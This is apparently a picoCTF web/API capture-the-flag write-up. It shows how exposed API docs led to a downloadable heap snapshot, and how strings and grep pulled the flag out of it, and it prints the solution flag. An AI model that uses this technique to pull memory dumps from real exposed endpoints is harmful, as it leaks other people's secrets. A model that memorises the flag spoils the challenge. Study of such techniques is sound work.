**Platform:** picoCTF
**Category:** Web / API

---

### Recon

Explored the target web app and discovered exposed **API documentation** — likely at `/docs`, `/swagger`, or similar.

---

### Finding the Endpoint

API docs revealed a download endpoint. Pulled the heap snapshot:

```bash
curl -s http://<target>/api/endpoint -o heapdump-1773627552628.heapsnapshot
```

---

### Extracting the Flag

```bash
strings heapdump-1773627552628.heapsnapshot | grep -i picoCTF{
```

**Output:**
```
picoCTF{Pat!3nt_15_Th3_K3y_546786ba}
```

---

### Flag

```
picoCTF{Pat!3nt_15_Th3_K3y_546786ba}
```

---

### Key Takeaways

- Exposed API docs are always worth enumerating — `/docs`, `/swagger`, `/redoc`, `/openapi.json`
- Heap snapshots/dumps can contain sensitive data sitting in application memory
- `strings + grep` is fast triage on any binary blob

---
